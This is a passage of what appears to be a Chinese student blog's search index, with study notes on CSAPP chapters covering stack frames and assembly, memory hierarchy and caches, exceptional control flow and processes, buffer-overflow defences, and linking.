先讨论32位的计算机，计算机物理内存的大小是固定的，就是计算机主板内存槽上的实际物理内存，cpu可以直接进行寻址，物理内存的容量是固定的，但是寻址的空间取决于cpu地址线的数量。在32位系统上，线性地址空间可达4G（2^32）；这4G一般是按照3：1的比例进行分配，用户进程享有3G的空间，而内核独自享有剩下的1G内存 2、谈谈栈帧的概念栈帧(stack frame)，机器用栈来传递过程参数，存储返回信息，保存寄存器用于以后恢复，以及本地存储。为单个过程(函数调用)分配的那部分栈称为栈帧。栈帧其实 是两个指针寄存器，寄存器%ebp为帧指针（指向该栈帧的最底部），而寄存器%esp为栈指针（指向该栈帧的最顶部），当程序运行时，栈指针可以移动(大多数的信息的访问都是通过帧指针的，换句话说，就是如果该栈存在，%ebp帧指针是不移动的，访问栈里面的元素可以用-4(%ebp）或者8(%ebp)访问%ebp指针下面或者上面的元素)。总之简单 一句话，栈帧的主要作用是用来控制和保存一个过程的所有信息的。栈帧结构如下所示：大概解释：假设过程P（调用者）调用过程Q（被调用者），则Q的参数放在P的栈帧中。另外，当P调用Q时，P中的返回地址被压入栈中，形成P的栈帧的末尾 （返回地址就是当程序从Q返回时应该继续执行的地方）。Q的栈帧从保存的帧指针的值开始，后面到新的栈指针之间就是该过程的部分了。 3、函数具体调用示例源代码（忽略主函数）: int swap_add(int* xp,int* yp) { int x = *xp; int y = *yp; *xp = y; *yp = x; return x+y;}int caller(){ int arg1 = 534; int arg2 = 1057; int sum = swap_add(&amp;arg1,&amp;arg2); int diff = arg1 - arg2; return sum * diff;} 经过汇编之后caller部分的代码为： caller: pushl %ebp //保存%ebp movl %esp,%ebp //设置新的帧指针为旧的栈指针 subl $24,%esp //分配24子节的栈空间 movl $534,-4(%ebp) //设置arg1=534 movl $1057,-8(%ebp) //设置arg2=1057 leal -8(%ebp),%eax //计算&amp;arg2 movl %eax,4(%esp) //将&amp;arg2存入栈中 leal -4(%ebp),%eax //计算&amp;arg1 movl %eax,(%esp) //将&amp;arg1存入栈中 call swap_add //调用swap_add-------------------》过程调用 movl -4(%ebp),%edx /从栈中取出arg1,和arg2的值 subl -8(%ebp),%edx //为了计算diff, imull %edx,%eax leave //为返回准备栈，GCC 产生的代码有时候会使用leave指令来释放栈帧， //而有时会使用一个或者两个popl指令。两个方法都可行。 ret //从过程调用中返回 这段代码先保存了%ebp的一个副本，将新的过程（该函数的ebp）的ebp设置为栈帧的开始位置。然后将栈指针减去24，从而在栈上分配了24字 节的空间（你应该思考一下为什么是24字节,记得有两个为保存的寄存器），然后是初始化两个局部变量，计算两个局部变量的地址并存入栈中，形成了函数swap_add的参数。将这些 参数存储到相对于栈指针偏移量为0和+4的地方，留待稍后的swap_add调用访问。然后调用swap_add swap_add: pushl %ebp //save old %ebp movl %esp,%ebp //set %ebp as frame pointer pushl %ebx //save %ebx movl 8(%ebp),%edx //Get xp movl 12(%ebp),%ecx //Get yp movl (%edx),%ebx //Get x movl (%ecx),%eax //Get u movl %eax,(%edx) //Store y as xp movl %ebx,(%ecx) //Sotre x as yp addl %ebx,%eax //return value = x + y popl %ebx //restore %ebx popl %ebp //restore %ebp ret //从过程调用中返回, 将控制转移回caller 说明三点，1、说明一点程序在执行到swap_add的代码之前，也就是在执行call语句已经把返回地址压入栈中，包括%esp-4. 2、最后一部 分的popl %ebx popl %ebp。它的作用是恢复了之前存储的栈帧指针的值. 3、返回值是存入了%eax中，在接下来的调用程序caller中直接访问该寄存器 整个过程的栈变化如下所示","link":"2018/12/21/CSAPP%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%9D%A5%E4%B8%80%E9%81%8D%E4%B9%8B%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A0%88%E5%B8%A7%E7%9A%84%E5%8F%98%E5%8C%96/"},{"title":"CSAPP又双叒叕来一遍之存储器层次结构","text":"再安利一波csapp真优秀，本章之后你会了解内存，机械硬盘，固态硬盘等储存器的优劣原理，你会理解为什么只有机械硬盘的笔记本升级到固态就脱胎换骨了一番，内存是DRAM,而固态等是ROM,还有就是局部性的哲学。通过学习高速缓存，理解程序的局部性的真正意义（你还能看到csapp第三版封面的图是啥玩意。 1、存储技术1.1、随机访问存储器静态RAM：（SRAM）用作高速缓存，通常只有几兆，在CPU芯片上、下；硬件设计中，将每个位存在一个双稳定的存储单元中，如下图所示，只有在两边的时候保持稳定性：动态RAM：（DRAM）用作主存（我们通常说的机器的内存），通常几百、几千兆。每个单位使用一个电容和一个访问晶体管构成，容易被干扰，有的加入有纠错码。系统需要周期性读出，然后刷新重写存储器的每一位。DRAM详细构造图：访问示例（我们来看看是如何访问超单元（2，1）处的内容）为了加快二维数组的访问，存储控制器在读取（2，1）处的内容的时候，使用addr先发送行地址2到DRAM芯片中，拷贝整个第二行的内容到内部缓冲区中，然后发送列地址1，从内部行缓冲区中读取1的地址内容通过data发送到存储控制器中去。有缓存的问题所有这就能解释当初zzz学长解释下面两个循环为什么第一个快于第二个。（赵神牛逼 1.2、存储器模块如图所示是一个64M的主存，芯片编号0-7，每个芯片存储8M的数据，存储器模块将其组合起来，聚合内存。将每单个芯片的超单元映射成主存地址A的各个字段。这样控制器收到一个主存地址A的时候，存储控制器将其选择包含的具体芯片，将A转换成（i，j）的形式，然后将（i，j）发送到芯片模块中开始取数据。存储在ROM设备中的程序通常称为固件，当一个计算机系统通电以后，它会运行存储在ROM中的固件。 1.3、访问主存（读事务、写事务）读事务：考虑当我们执行，movl A，%eax的情况，地址A的内容会被加载到eax中去，总线发起读事务（分三步）：①CPU将A的地址总线放到系统总线上，桥作为中转点，将地址信号传送到存储器总线上去；②主存感觉到了存储器总线上的地址信号，从存储器总线上读地址，并从主存中取出相应的数据，写入到存储器总线上去，桥将数据专递到系统总线中去；③CPU感觉到了系统总线上的数据，将数据拷贝到eax中。I/O桥作为中转，将地址信号从系统总线转到存储器总线，然后又将数据从存储器总线转到系统总线。在这个过程中，CPU始终是从系统总线上发送地址，读取数据，主存始终是从存储器总线上接受地址并发送数据。（写事务是一个逆向过程不做讲解） 1.4、磁盘存储 （硬盘）磁盘由盘片构成，表面覆盖的有磁性材料，中间是一个主轴，通过旋转读取和记录数据。每组同心圆磁道分割的区域就是一个扇区。扇区之间是有间隙的，如图：磁盘读写操作：磁盘以扇区为单位来读写数据，对扇区的访问时间由三个部分组成：寻道时间、旋转时间、传送时间。以图a为例，当我们要访问同心圆磁道5的内容时，寻道时间是指传动手臂将读写头移动到同心圆第五磁道的时间，旋转时间指的是同心圆5开始读取内容的位置，如果手臂移动到第五磁道的时候读写位置刚过，就要等磁盘旋转一圈之后再读取；传送时间，扇区第一个位处于读写头的时候，读写该扇区的时间。（寻道时间和旋转延迟大致相当） 2、局部性局部性原理是指CPU访问存储器时，无论是存取指令还是存取数据，所访问的存储单元都趋于聚集在一个较小的连续区域中。 –来自百度百科 我们讲存储器体系结构就会很好的理解局部性，简单的来说，我们的主存就是我们为了提高我们磁盘文件的一个高速缓存，因为我们知道这一时刻访问到磁盘的数据可以下一时刻也会被访问，这一位置被访问的数据，邻居位置也可能会被访问。这也就是我们通常说的：时间局部性和空间局部性。最好的例子就是上面数组求和。可以往前看看。 3、存储器层次结构3.1、书上大图越往上，代表的是访问速度越快，当然存储容量小，价格也非常的高。越往下，意味着访问速度越慢，存储容量大，价格相对便宜。通常我们CPU的寄存器是L1的高速缓存，L1是L2的高速缓存，以此类推。 3.2、缓存命中和不命中上图我们把k+1理解为主存，被划分为16个块来存储数据，块的大小是固定的。我们把K层理解成L3高速缓存，任何时刻L3就是主存的一个子集。上图我们能看出，L3只能保存4个块的数据，块的大小保持和主存的大小一样的。上图中我们看到，L3中保存的是主存中的4，9，14，3的数据。那么什么又是命中率和不命中率呢？缓存命中：当程序需要第k+1层数据块14的时候，程序会在当前存储的k层，寻找块14的数据，刚好14在k层的话，就是一个缓存命中，这比从k+1层读取的速度要快很多。缓存不命中：当程序需要访问到块12的时候，在k层没有该数据块，就是一个缓存不命中，这时候就会从k+1层中读取块12将其替换到k层的一个数据块（覆盖或驱逐一个已有的数据块）。程序还是从k层访问块12。放置策略：如果我们从k+1层中获得的数据随机的放置在k层，这样的随机放置就会导致访问的效率降低，我们的放置策略是块i必须放置在（imod4）中，也就是0，4，8，12会映射到同一个k层的块0中。这就会导致一个冲突不命中，也就是说如果程序交替请求k+1层的0，4块，由于会一直映射到k层的0块中，这时候虽然k层有空余的缓存，但还是每次不命中。 3.3、类比一下web的缓存web缓存是通过http头中的上次If-Modified-Since或者If-Unmodified-Since使用对比上次修改时间验证资源是否需要更新，当访问一个网页，网页如果在本地有缓存其实并不是直接使用缓存中的page因为你要保证服务器没变化，所以本机还是会发出一个请求询问服务器该界面最后一次修改的时间，服务器只要返回时间就可以而不必要返回内容，如果服务器上网页的修改时间是缓存时间之前的，那直接使用缓存的，如果缓存之后的服务器修改了，将重新请求网页。 4、高速缓存存储器（集成在CPU内部的一个部件L1、L2、L3三级缓存） 4.1、通用高速缓存存储器内部结构高速缓存是一个数组，每个组包含一个或多个行，每个行有一个有效位、一个标记位，以及数据块。我们进行访问的地址结构就是：t的标记位+s个组索引+b个块偏移； 4.2、直接映射高速缓存（每个组只有一行的简单访问模式）(举例：直接映射高速缓存的抽取请求字的过程就像我们投递快件一样，组索引其实就像我们的邮政编码，比如我们这里的510824，然后找到编码的组，也就是我的大位置（xx县），然后看标记上写的具体xx小区x栋楼，并且核实该地址是否有效（有效位1），两项都满足条件以后将该快件给快递员投递，快递员到达具体xx小区x楼的时候就根据门牌号（偏移位）敲开你家的门。binggo，快递到达）高速缓存确定一个请求是否命中，然后抽出请求字的过程分两步：1&gt; 组选择：很好理解，就是地址位中的组索引匹配高速缓存中的组2&gt; 行匹配和字抽取：行匹配主要是对有效位进行匹配，和标记位与高速缓存中的标记位一致，这就是一个命中。最后的字抽取就简单了，只是看地址后面的偏移值。 4.3、结构剖析（真正意义上的高速缓存）Intel Core I7高速缓存层次结构在实际的商用CPU中，将高速缓存分为d-cache数据高速缓存，i-cache指令高速缓存和同一高速缓存，i7的架构中我们可以看出，L1分为数据和指令高速缓存，共享L2高速缓存，同时每个核共享L3高速缓存 5、存储器山图♂存储器的性能不能简单的用一个数字来描述，如果实在要形容的话，是一座时间局部性和空间局部性构成的山。山峰和低谷的差别不是一个数量级。明智的程序员会试图构造运行在山峰的程序而不是低谷。我们来看看这座存储器山是啥意思。这段代码所做的事情，就是将data数组的内容依次读取到CPU的寄存器中。其中elems代表的是data的工作集大小也就是size时间局部性，代表Y轴；而stride（步长）代表的是横轴X；Z轴表示吞吐量，Mb/s。越往上吞吐量越大（红色部分）。我们反复以不同的size和stride值调用我们的核心测试代码，就会得到如上图的存储器山。最高处的红色山峰为L1，由于工作集（size）很小，能全部保存在L1高速缓存中，所以这时候即使stride很长，对于性能也没太大的影响。L2和L3、主存随着stride的增加有明显的坡度，空间局部性下降。特别明显的是，主存的蓝色山峰，即使工作集很大（时间局部性极地）其stride（空间局部性）的影响也相当的明显，最高与最低处相差7倍。也就是告诫我们，即使时间局部性无法改变了，空间局部性也可以使得程序的性能极大的提高。","link":"2019/01/13/CSAPP%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%9D%A5%E4%B8%80%E9%81%8D%E4%B9%8B%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/"},{"title":"CSAPP又双叒叕来一遍之异常控制流","text":"小声bb,几天没更博客了，这几天真的过得和狗一样，怪也只能怪自己太把自己高看了以为两天写课设绰绰有余，其实只是一个小萌新，在达成48小时从零开始写完数据结构课设的同时完成了两天两夜不睡的新成就，昨天验收结束睡了一觉，终于有时间看书了，CSAPP本来觉得看完了，但是翻了翻发现还是很多知识点之前跳过了，罪过罪过，劝告大家一句话“能够完整的看完一本书是一个人受过高等教育的体现”，希望之后的经典书能整本认真看完。 异常控制流这章个人感觉精华除了异常外，讲进程的真的精髓 1、异常控制流（Exceptional Contro Flow）处理过程这一过程如上图所示，应用程序本来在执行Icur指令，但是有些事件（定时器信号、算术溢出等）会使得处理器的状态发生变化，这时候处理器会通过一张异常跳转表，进行跳转到专门的异常处理程序中，异常处理程序执行完任务以后：可能返回当前正在执行指令、返回当前下一条指令或者终止被中断的程序。 1.1、异常表&amp;&amp;异常表基地址系统中可能出现的异常都被分配了一个唯一的非负整数的异常号（exception number)，而异常表储存异常号对应的一个异常处理程序当你本机发生一个异常后，你只能拿到这个异常的异常号，你要触发一个异常的处理，你要拿到该异常处理程序的地址，所以通过异常表基址寄存器+异常号获得异常表的数据而执行异常处理。 1.2、四大异常分类 （1）中断中断：是异步发生的，来自处理外部的I/O设备信号的结果.（设备信号之后会详讲实例：当手机播放器在公放音乐的时候，你突然打开某大游戏可能音乐暂时卡住，大概一瞬间后歌曲继续播放，当然大家手机tql，时间太短，感觉不到。（可能我讲的有问题，可能只是突出穷买不起好手机吧，嘤嘤嘤 （2）陷阱和系统调用实现系统调用，在用户程序和内核之间提供一个像函数调用一样的接口。（csapp原书上的实例）比如要读一个文件的内容（read），这些内核服务受到控制的访问，处理器提供的是syscall n指令来响应用户的请求，导致一个陷阱异常，这个异常程序对参数解码并调用内核程序。这个异常处理程序运行在内核模式中。 （3）故障故障发生时，处理器将控制转移到故障处理程序中，由故障处理程序修正错误。如果能够修正就返回当前指令重新执行，如果不能修正就返回到内核的abort中。（csapp原书上的实例）缺页异常，当指令使用一个虚拟地址，但是该地址对应的物理地址在内存中找不到，所以必须从磁盘中取出，就会发生故障。#####（4）终止通常是由一些硬件引起的不可恢复的致命错误直接返回到abort中，终止该应用程序。 2、进程之前写过线程与进程的暧昧缠绵，但是只是从功能上讲，为了友好些有很多沙雕图，也没有讲那么详细对于进程最经典的定义就是一个执行中的程序实例。进程是一个伟大的魔术师，她提供给每个运行的程序一种假象，好像每个程序都在独占处理器和地址空间。其实主要思想就是逻辑控制流和私有地址空间。 2.1、进程控制流上图是一个运行了三个进程A、B、C的系统，处理器的控制流分成了3个，每一个进程1个。随着时间的增加，进程A先运行了一小段（①），然后进程B运行直到结束（②），随后进程C运行了一小段（③）后切换到进程A运行直到A结束（④），最后切换到进程C运行直到结束（⑤）。这样一来每个进程执行它的流的一部分，然后被抢占。由于CPU总是毫秒级别的转移我们什么都不会察觉到。就提供了一种每个程序独占的假象。时间片：进程A执行它控制流的一部分的每个时间片段，就叫时间片。 2.2、私有地址空间这张图放过很多次了，在内存那章会详细讲这个私有的地址空间最上部是内核保留的，最下部是预留给用户程序的。代码始终是从0x08048000处开始（32位系统）。 2.3、用户模式和内核模式处理器为了安全起见，不至于损坏操作系统，必须限制一个应用程序可执行指令能访问的地址空间范围。就发明了两种模式用户模式和内核模式，其中内核模式（上帝模式）有最高的访问权限，甚至可以停止处理器、改变模式位，或者发起一个I/O操作，处理器使用一个寄存器当作模式位，描述当前进程的特权。进程只有当中断、故障或者陷入系统调用时，才会将模式位设置成上帝模式，得到内核访问权限，其他情况下都始终在用户权限中，就能够保证系统的绝对安全。 2.4、上下文切换机制内核中有一个专门的调度程序，当从进程A切换到进程B的时候，内核调度器为每个进程保存一个上下文状态（运行环境保存）：包含程序计数器、用户栈、状态寄存器等，然后切换到另外一个进程处开始执行。当内核代表用户执行系统调用的时候，就会发生上下文切换，如上图所示，当进程A调用read函数的时候，内核代表进程A开始执行系统调用读取磁盘上的文件，这需要耗费相对很长的时间，处理器这时候不会闲着什么都不做，而是开始一种上下文切换机制，切换到进程B开始执行。当B在用户模式下执行了一段时间，磁盘读取完文件以后发送一个中断信号，将执行进程B到进程A的上下文切换，将控制权返回给进程A系统调用read指令后面的那条指令，继续执行进程A。（注：在切换的临界时间内核模式其实也执行了B一个小段时间） 3、Linux自己写写关于进程的demo3.1、fork（）函数来创建一个新进程关于fock函数的巴拉巴拉，如果你困了，请跳过这一大串文字，直接看书上两个demo吧我们使用fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，除了PID不同外，子进程可以读写父进程中打开的任何文件。一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。相当于克隆了一个自己。fork函数有一个特别的地方，虽然只被调用一次，却能返回两次。(fock()函数第一次返回是在父进程中，返回的是子进程的PID；一次是在子进程中，返回的是0；因为PID总是非零，返回值为0就说明在子进程中执行了。用来区分，另外Linux下Fock函数定义在unistd.h 中)希望大家自己敲一敲，就算活动活动手指，当作一种运动吧fock函数demo1（结果出现原因、x在父子进程中是单独成立的，当调用pid = Fork（）；的时候，第一次返回的是进程的子ID，由于不为0，所以继续执行main函数中的printf，打印输出x = 0；第二次就在子进程中执行了，返回的pid为0表示在子进程中执行，由于两个进程有相对独立的地址空间，子进程得到的只是父进程的一个拷贝，所以x的初始值仍然是1，输出的结果就是x=2了。（至于为啥都输出在屏幕上了，是因为这两个进程共享已经被打开的stdout文件，子进程是继承父进程的，因此输出也是指向屏幕的）在csapp516页上一个有意思的题目，询问下面的的输出值，想了好久，我现在直接输出了，你也可以认真想想贼有意思fock函数demo2,这个图能感受到fock函数 3.2、waitpid函数,sleep函数,pause函数，execve函数等感兴趣的单独查看，这里就不展开了4、信号4.1、定义信号是一种更高层次的软件形式的异常，它允许进程中断其他进程。一个信号就是一个消息，我们列出Linux系统上30个不同种类的信号：正在运行的前台子进程，当键入ctrl-c，发送序号2（SIGINT）；当一个进程发送信号9（SIGKILL）就会强制终止另外一个进程；当子进程终止时，就会发送信号17（SIGCHILD）给父进程。 4.2、举个例子（实战还是比概念看起来爽啊（ps用来查看所有进程，在windows是-netstat ano）1&gt; 使用/bin/kill程序发送信号(使用完整路径)发送9号（SIGKILL）信号给进程6279终止该进程，如果使用-6279就是该进程组的所有进程； 4.3、你看到这里应该也累了，信号后面的知识看的不是很懂，如果你真的感兴趣，希望你能自己去看书吧（另外书上配套了很多优秀的例子和实验，由于本人才疏学浅，就不把自己的结果展示怕误人子弟，非常安利大家去感受大师的魅力","link":"2019/01/11/CSAPP%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%9D%A5%E4%B8%80%E9%81%8D%E4%B9%8B%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81/"},{"title":"CSAPP又双叒叕来一遍之程序的机器级表示","text":"一、本章主要内容 ] 二、程序编码计算机系统使用了多种不同形式的抽象，利用更简单的抽象模型来隐藏实现的细节。对于机器级编程来说，其中两种抽象尤为重要： 指令集体系结构或指令级框架：它定义了处理器状态、指令的格式，以及每条指令对状态的影响。IA32将程序的行为描述成好像每条指令时按顺序执行的，一条指令结束后，下一条再开始。（实际上处理器并发地执行许多指令，但是可以采取措施保证整体行为与ISA指定的顺序执行完全一致） 机器级程序使用的存储器地址是虚拟地址：提供的存储器模型看上去是一个非常大的字节数组。存储器系统的实际实现是将多个硬件存储器和操作系统软件组合起来。 程序存储器(program memory)包含： 程序的可执行机器代码、操作系统需要的一些信息、栈、堆。程序存储器用虚拟地址来寻址（此虚拟地址不是机器级虚拟地址）。操作系统负责管理虚拟地址空间（程序级虚拟地址），将虚拟地址翻译成实际处理器存储器中的物理地址（机器级虚拟地址）。 三、拿一个C自己玩玩 用c语言写一个代码文件hello.c 在命令行上使用“-S”选项，就能看到C语言编译器产生的汇编代码Linux&gt; gcc -Og -S hello.c 编译为可执行文件Linux&gt; gcc -o hello hello.c 看机器代码文件的内容，有一类称为反汇编器，带“-d”命令行linux&gt; objdump -d hello (ps：汇编指令单独写博客，本地不展开)四、 过程 过程是软件中一种很重要的抽象。它提供了一种封装代码的方式，用一组指定的参数和一个可选的返回值实现某种功能。然后，可以在程序中不同的地方调用这个函数。过程机制的构建需要实现传递控制、传递数据、分配和释放内存。 当x86-64过程需要的存储空间超出寄存器能够存放的大小时，就会在栈上分配空间。这个部分称为过程的栈帧。 （栈在过程中的变化单独细讲，本处不展开） 五、异质的数据结构Struct 和 Union有下列区别： 在存储多个成员信息时，编译器会自动给struct第1个成员分配存储空间，struct 可以存储多个成员信息，而Union每个成员会用同一个存储空间，只能存储最后一个成员的信息。 都是由多个不同的数据类型成员组成，但在任何同一时刻，Union只存放了一个被先选中的成员，而结构体的所有成员都存在。 对于Union的不同成员赋值，将会对其他成员重写，原来成员的值就不存在了，而对于struct 的不同成员赋值 是互不影响的。 六、对抗缓冲区溢出攻击1、栈随机化（ASLR和PIE）为了在系统中插入攻击代码，攻击者不但要插入代码，还要插入指向这段代码的指针，这个指针也是攻击字符串的一部分。产生这个指针需要知道这个字符串放置的栈地址。在过去，程序的栈地址非常容易预测，在不同的机器之间，栈的位置是相当固定的。栈随机化的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行相同的代码。它们的栈地址都是不同的。实现的方式是：程序开始时，在栈上分配一段0–n字节之间的随机大小空间。程序不使用这段空间，但是它会导致程序每次执行时后续的栈位置发生了变化。在Linux系统中，栈随机化已经变成了标准行为。（在linux上每次运行相同的程序，其同一局部变量的地址都不相同） 2、栈破坏检测在C语言中，没有可靠的方法来防止对数组的越界写，但是，我们能够在发生了越界写的时候，在没有造成任何有害结果之前，尝试检测到它。最近的GCC版本在产生的代码中加入了一种栈保护者机制，用来检测缓冲区越界，其思想是在栈中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值。这个金丝雀值是在程序每次运行时随机产生的，因此，攻击者没有简单的办法知道它是什么。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者函数调用的某个操作改变了。如果是，那么程序异常终止。 3、限制可执行代码区域限制那些能够存放可执行代码的存储器区域。在典型的程序中，只有保存编译器产生的代码的那部分存储器才需要是可执行的，其他部分可以被限制为只允许读和写。现在的64位处理器的内存保护引入了”NX”(不执行)位。有了这个特性，栈可以被标记为可读和可写，但是不可执行，检查页是否可执行由硬件来完成，效率上没有损失。","link":"2018/12/06/CSAPP%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%9D%A5%E4%B8%80%E9%81%8D%E4%B9%8B%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%9C%BA%E5%99%A8%E7%BA%A7%E8%A1%A8%E7%A4%BA/"},{"title":"CSAPP又双叒叕来一遍之计算机系统漫游","text":"说在前面的一些废话，如果你困了，请直接跳至正文刚入学就买的这本《深入理解计算机系统》。一年多来，学学停停，但是永远记住了第一章第二段的第二句话如果你全力投身学习本书的概念，完全理解底层计算机系统以及它对应用程序的影响那么你会走向为数不多的“大牛”的道路 好一个大牛的道路，对于热爱计算机的人来说的“大牛的道路” 和 爱好钱财的人的“富婆包养路”（或者是富萝莉）地位相同在这句话的驱动下（多少人和我一样啊），这本书是我花费最多时间和精力去啃的专业书籍这本书确实无敌到能让一个完全不懂的孩童般见识到了计算机专业广阔无垠、波澜壮阔的海洋。惭愧的是自己完全没有达到大牛们啃完后通彻计算机系统的境界即便是如此我还是受益匪浅，CSAPP无愧为计算机专业的神书！如今我已经大二，按理说是踌躇满志的时候，我却满是遗憾，遗憾自己大一后半学期的固步自封，浪费了那么多宝贵的青春年华在毫无意义的事物上，追求短暂的愉悦却荒芜了年华。 但是往昔不可忆，切记不要再浪费自己的青春和元气。所以重整旗鼓，这回想认真总结一下（感言结束，疯狂暗示♂）一、分析hello.c的例子，从其生命周期分析系统的执行过程hello.c 源代码： #include&lt;stdio.h&gt;int main(){ printf(&quot;hello world&quot;); return 0;} 在Unix系统上,从源文件到目标文件的转化是由编译器驱动程序完成的: unix&gt;gcc -o hello hello.c 执行这四个阶段的程序(预处理器、编译器、汇编器、链接器)一起构成了编译系统(compilation system). 预处理阶段:也就是对程序进行预处理。C程序中特指“”#“”包含的库文件。预处理器将库文件直接导入到源代码中，此例就是将头文件“stdio.h”导入到源程序中，生成hello.i源代码。 编译阶段:编译器(ccl)将文本文件hello.i翻译成文本文件hello.s,它包含一个汇编语言程序. 汇编阶段: 将汇编语言转化为机器指令,生成二进制文件——hello.o。 链接阶段.目标文件合并到我们的hello.o程序中,链接器就处理这种合并.得到hello文件,一个可执行目标文件,可以被加载到内存中,由系统执行. 二、信息就是位+上下文源程序实际上就是由一个值0和1组成的位(bit)序列,8个位被组织成一组,称为字节.每个字节表示程序中某个文本字符.大部分现代系统都是有ASCII标准表示文本字符,只由ASCII字符构成的文件称为文本文件,所有其他文件都称为二进制文件系统中所有的信息—–包括磁盘文件、存储器中的程序、存储器中存放的用户数据以及网络上传送的数据,都是由一串位表示的.区分不同数据对象的唯一方法是我们读到这些数据对象时的上下文.比如:在不同的上下文中,一个同样的字节序列可能表示一个整数、浮点数、字符串或者机器指令. 三、系统的硬件组成CPU:中央处理单元   ALU:算术/逻辑单元  PC:程序计数器  USB:通用串行总线 总线贯穿整个系统的是一组电子管道,称做总线,它携带信息字节并负责在各个部件间传递. I/O设备:输入/输出(I/O)设备是系统与外部世界的联系通道 主存:主存是一个临时存储设备,在处理器执行程序时,用来存放程序和程序处理的数据. 处理器:中央处理单元(CPU),简称处理器,是解释(或执行)存储在主存中指令的引擎.处理器的核心是一个字长的存储设备(或寄存器),称为程序计数器(PC). 四、存储设备形成层次结构存储器层次结构的主要思想是一层上的存储器作为低一层存储器的高速缓存. 五、线程进程，单独分离写了个博客，这里不重复六、计算机系统中抽象的重要性 文件是对I/O的抽象 虚拟存储器是对程序存储器的抽象. 进程是对一个正在运行的程序的抽象. 虚拟机,它提供对整个计算机(操作系统,处理器和程序)的抽象. 七、虚拟内存虚拟内存是一个抽象概念，它为每个进程提供了一个假象，即每个进程都在独占地使用主存。每个进程看到的内存都是一致的，称为虚拟地址空间。在linux中，进程的虚拟地址空间如下图 程序代码和数据：对于所有进程来说，代码从一固定地址开始，紧接和C全局变量相对应的数据位置。第七章研究链接和加载时，学到更多有关地址空间的内容。 堆 ：代码和数据区紧随着运行时堆。代码和数据区是在进程一开始就被规定了大小，与此不同，调用malloc和free时堆动态的扩展和收缩。第9章学习管理虚拟存储器时，详细研究。 共享库：地址空间的中间部分存放C标准库和数学库这样共享库代码和数据的区域。共享库概念非常强大，相当难懂。第七章详解。 栈: 用户虚拟地址顶部的是用户栈，编译器用它来实现函数调用。和堆一样，在执行时动态的扩展和收缩。第三章详解。 内核虚拟内存。 内核总是驻留在内存中，是操作系统一部分。 总结：由于本章只是计算机漫游，故只阐释了计算机的大概，具体细节后面章节，慢慢展开","link":"2018/12/03/CSAPP%E5%8F%88%E5%8F%8C%E5%8F%92%E5%8F%95%E6%9D%A5%E4%B8%80%E9%81%8D%E4%B9%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%BC%AB%E6%B8%B8/"},{"title":"CSAPP又双叒叕来一遍之链接","text":"整体看本章（第七章讲了啥） 链接是将各种不同文件的代码和数据部分收集（符号解析和重定位）起来并组合成一个单一文件的过程。 目标文件三种形式：1、可重定位目标文件：包含二进制代码和数据，其形式可以在编译时与其他可重定位目标文件合并起来，创建一个可执行目标文件。2、可执行目标文件：包含二进制代码和数据，其形式可以直接拷贝到存储器并执行。3、共享目标文件：一种特殊类型的可重定位目标文件，可以在加载或运行时被动态地加载到存储器并链接。 看一下GCC做了哪些事情 细讲最后一步链接器（ld）做了啥1、符号解析。目标文件定义和引用符号，符号解析的目的是将每个符号引用和一个符号定义联系起来；2、重定位：把每个符号定义与一个存储器位置联系起来，然后修改对这些符号的引用，是的他们指向这个存储器位置，从而实现重定位。 链接器操作的目标文件目标文件一般是由汇编器生成的.o后缀的文件，大概有三种不同的形式：可重定位目标文件；可执行目标文件和共享目标文件。我们接下来讨论的目标文件是基于Unix系统的ELF格式（Exxcutable and Linkable Format），这同Windows系统上的PE（Portable Executable）文件格式在基本概念上其实是相似的：一个典型的ELF可重定位目标文件的格式： .text：已编译程序的机器码；.rodata：只读数据（read-only-data）；.data：已初始化的全局C变量；.bss：未初始化的全局C变量（better save space）;.symtab：一个符号表（定义和引用的函数和全局变量信息）；.rel.text：代码重定位条目， 一个.text节中位置的列表，需要修改的位置;.rel.data: 被模块引用或定义的任何全局变量的重定位信息；.debug：一个调试符号表； .line：原始C源程序中的行号和.text机器指令的映射；.strtab: 一个字符串表 ld任务一 符号解析（符号和符号表）保存于.symtab中的是一个符号表，其是定义和引用函数和全局变量的信息。有三种不同类型的符号：全局符号（不带static），外部引用（external）和本地符号。如果是带有static符号的就会在.data和.bss中为每个定义分配空间，并在.symtab中创建一个唯一名字的本地符号。比如：中有两个static定义的x变量，其会在.data中分配空间，并在.symtab中创建两个，x.1表示f函数的定义和x.2表示函数g的定义。（注：使用static可以保护你自己的变量和函数）符号解析任务简单的说，就是链接器使得所有模块中的每个符号只有一个定义。链接器在这一个阶段的主要任务就是把代码中的每个符号引用和确定的一个符号定义联系起来。对于本地符号，这个任务相对来说是简单的。复杂的就是全局符号，编译器（cc1）遇到不是在当前模块中定义的符号时，会假设该符号的定义在其他模块中，生成一个链接器符号交给链接器处理。如果链接器ld在所有的模块中都找不到定义的话就会抛出异常。 如何链接和解析静态库像printf等一些常用的函数，都是在libc.a静态库中，静态库以一种存档的特殊文件（.a）格式，将可以定位的目标文件集合成一个.a文件。 ld任务二 重定位完成了符号解析以后，链接器的第二个任务就是合并输入模块，并为每个符号分配运行时的地址。重定位节和符号定义：在这一步中，链接器将所有模块中的.data节合并成一个文件的.data节，运行时存储器的地址也会赋给新的聚合节。然后就是，重定位节中的符号引用：链接器修改代码节和数据节中对每个符号的引用，使得他们指向正确的运行时地址。这一步要用到重定位条目这一数据结构，我们来描述这个过程： 